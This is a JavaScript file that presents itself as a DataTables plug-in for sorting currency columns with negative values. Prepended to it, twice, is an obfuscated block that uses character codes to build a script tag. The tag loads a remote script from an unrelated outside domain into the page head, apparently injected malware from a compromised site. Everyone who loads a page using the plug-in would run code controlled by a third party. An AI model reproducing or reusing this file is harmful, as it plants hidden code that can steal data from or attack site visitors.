Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This plug-in will add automatic negative currency detection for currency columns to
 * DataTables. Note that only $, c, £ and € symbols are detected with this code,
 * This plugin has also been updated to automatically detect negative values either those
 * using '-' as well as numbers using '()' to specify negatives.
 * This plugin also includes automatic type detection
 *
 *  @name brackets-negative
 *  @summary Detect data of currency type with a leading currency symbol as well at detect two types of negative number formatting
 *  @author [Tom Buckle](http://sprymedia.co.uk)
 */
(function(){
	// Change this list to the valid characters you want to be detected
	var validChars = "$£€c" + "0123456789" + ".-,()'";
	// Init the regex just once for speed - it is "closure locked"
	var
	str = jQuery.fn.dataTableExt.oApi._fnEscapeRegex( validChars ),re = new RegExp('[^'+str+']');
	$.fn.dataTableExt.aTypes.unshift(
		function ( data )
		{
			if ( typeof data !== 'string' || re.test(data) ) {
				return null;
			}
			return 'currency';
		}
	);
	$.fn.dataTable.ext.type.order['currency-pre'] = function ( data ) {
		//Check if its in the proper format
		if(data.match(/[\()]/g)){
			if( data.match(/[\-]/g) !== true){
				//It matched - strip out parentheses & any characters we dont want and append - at front
				data = '-' + data.replace(/[\$£€c\(\),]/g,'');
			}else{
				//Already has a '-' so just strip out non-numeric charactors exluding '-'
				data = data.replace(/[^\d\-\.]/g,'');
			}
		}else{
			data = data.replace(/[\$£€\,]/g,'');
		}
		return parseInt( data, 10 );
	};
}());
